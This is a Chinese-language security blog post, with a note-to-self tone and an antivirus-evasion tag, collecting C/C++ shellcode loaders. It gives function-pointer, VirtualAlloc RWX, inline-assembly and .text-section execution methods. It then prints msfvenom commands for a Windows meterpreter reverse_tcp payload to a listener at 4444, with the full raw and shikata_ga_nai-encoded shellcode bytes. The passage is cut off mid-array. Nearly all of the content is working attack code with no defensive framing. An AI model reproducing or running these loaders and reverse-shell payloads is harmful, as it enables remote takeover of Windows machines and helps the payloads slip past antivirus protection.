+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ShellCode Loader(持续更新) - Ghostasky&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='免杀' /><meta itemprop="name" content="ShellCode Loader(持续更新)">
+<meta itemprop="description" content="">
+
+<meta itemprop="wordCount" content="1002">
+<meta itemprop="keywords" content="免杀," /><meta property="og:title" content="ShellCode Loader(持续更新)" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/shellcodeloader/" /><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="ShellCode Loader(持续更新)"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/shellcodeloader/" /><link rel="prev" href="http://ghostasky.github.io/posts/ssti/" /><link rel="next" href="http://ghostasky.github.io/posts/powershell/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ShellCode Loader(持续更新)",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/ghostasky.github.io\/posts\/shellcodeloader\/"
+    },"genre": "posts","keywords": "免杀","wordcount":  1002 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/shellcodeloader\/","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "作者"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                >关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ShellCode Loader(持续更新)</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 0001-01-01 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span title="1002 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 2 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#cc">C/C++</a>
+      <ul>
+        <li><a href="#指针执行">指针执行</a></li>
+        <li><a href="#动态分配">动态分配</a></li>
+        <li><a href="#内联汇编">内联汇编</a></li>
+        <li><a href="#写到text段">写到text段</a></li>
+      </ul>
+    </li>
+    <li><a href="#shellcode">shellcode</a>
+      <ul>
+        <li><a href="#弹计算器">弹计算器</a></li>
+      </ul>
+    </li>
+    <li><a href="#vscode与visual-studio">vscode与Visual Studio</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>记录一些语言的shellcode 加载方式，持续更新&hellip;</p>
+<p>[toc]</p>
+<h2 id="cc" class="heading-element">
+  <a href="#cc" class="heading-mark"></a>C/C++</h2><p>首先是c的loader，分两种，指针直接执行和动态分配。</p>
+<h3 id="指针执行" class="heading-element">
+  <a href="#%e6%8c%87%e9%92%88%e6%89%a7%e8%a1%8c" class="heading-mark"></a>指针执行</h3><div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;windows.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">//设置入口地址，不弹出黑窗口
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">## pragma comment(linker,&#34;/subsystem:\&#34;Windows\&#34; /entry:\&#34;mainCRTStartup\&#34;&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;shellcode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//都可
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//((void(*)()) &amp;shellcode)();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//(*(void(*)()) &amp;shellcode)();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="c1">//也可以这样
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 	<span class="c1">//void (*func)();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//func = (void (*)())(void *)shellcode;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//func();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div><h3 id="动态分配" class="heading-element">
+  <a href="#%e5%8a%a8%e6%80%81%e5%88%86%e9%85%8d" class="heading-mark"></a>动态分配</h3><div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;windows.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;shellcode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">Memory</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Memory</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//动态分配虚地址空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">Memory</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//复制内存内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">Memory</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 id="内联汇编" class="heading-element">
+  <a href="#%e5%86%85%e8%81%94%e6%b1%87%e7%bc%96" class="heading-mark"></a>内联汇编</h3><div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;windows.h&gt;  
+</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">##pragma comment(linker, &#34;/section:.data,RWE&#34;)  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;shellcode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">__asm</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">offset</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jmp</span> <span class="n">eax</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 id="写到text段" class="heading-element">
+  <a href="#%e5%86%99%e5%88%b0text%e6%ae%b5" class="heading-mark"></a>写到text段</h3><div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##pragma section(&#34;.text&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kr">__declspec</span><span class="p">(</span><span class="nf">allocate</span><span class="p">(</span><span class="s">&#34;.text&#34;</span><span class="p">))</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xa5\xbf\x0f\x44\x25\x40</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="shellcode" class="heading-element">
+  <a href="#shellcode" class="heading-mark"></a>shellcode</h2><p>到kali机的，(自用</p>
+<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.188.129</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">a</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="n">Windows</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span>  
+</span></span><span class="line"><span class="cl"><span class="n">No</span> <span class="n">encoder</span> <span class="n">specified</span><span class="p">,</span> <span class="n">outputting</span> <span class="n">raw</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">354</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">1512</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xbc\x81\x68\x02</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.188.129</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">a</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="n">Windows</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span> <span class="o">--</span><span class="n">bad</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="n">with</span> <span class="n">size</span> <span class="mi">381</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">chosen</span> <span class="n">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">381</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">381</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">1626</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xbb\xfb\xb4\xcc\x3f\xda\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x59\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\x19\x41\x30\xd7\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xaa\xc9\x28\x0c\x9a\x1b\x4c\x47\x8e\xab\x04\xb2\xa4\x9e\x1a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xb7\xe9\x0a\xa8\xb5\x25\x3c\x19\x73\x10\x73\x9a\xb2\x9c\xdf</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x58\xd5\x60\x22\x8d\x35\x58\xed\xc0\x34\x9d\xbb\xaf\xd9\x73</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x6b\xdb\x77\x64\x18\x99\x4b\x85\xce\x95\xf3\xfd\x6b\x69\x87</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xb1\x72\xba\xec\x02\x6d\xb1\xaa\xb2\xdd\xc4\x99\x36\x14\xb2</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x21\x08\x58\x72\xd2\x5e\x2d\x84\x32\xaf\xf1\x2b\x7b\x1f\xfc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x32\xbc\x98\x1f\x41\xb6\xda\xa2\x52\x0d\xa0\x78\xd6\x91\x02</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0a\x40\x75\xb2\xdf\x17\xfe\xb8\x94\x5c\x58\xdd\x2b\xb0\xd3</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd9\xa0\x37\x33\x68\xf2\x13\x97\x30\xa0\x3a\x8e\x9c\x07\x42</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd0\x79\xf7\xe6\x9b\x68\xee\x97\x64\x73\x0f\xca\xf2\xbf\xc2</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf5\x02\xa8\x55\x85\x30\x77\xce\x01\x78\xf0\xc8\xd6\x09\x16</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xeb\x09\xb1\x77\x15\xaa\xc1\x5e\xd2\xfe\x91\xc8\xf3\x7e\x7a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x09\xfb\xaa\x16\x03\x6b\x95\x4e\xaf\xea\x7d\x8c\xd0\xfd\x21</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x19\x36\xad\x89\x49\xe7\x0e\x7a\x29\x57\xe7\x90\xa6\x88\x17</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x9b\x6d\xa1\xb2\x74\xdb\x99\x2a\xec\x46\x51\xca\xf1\x5d\x1f</span><span class="s">&#34;</span>
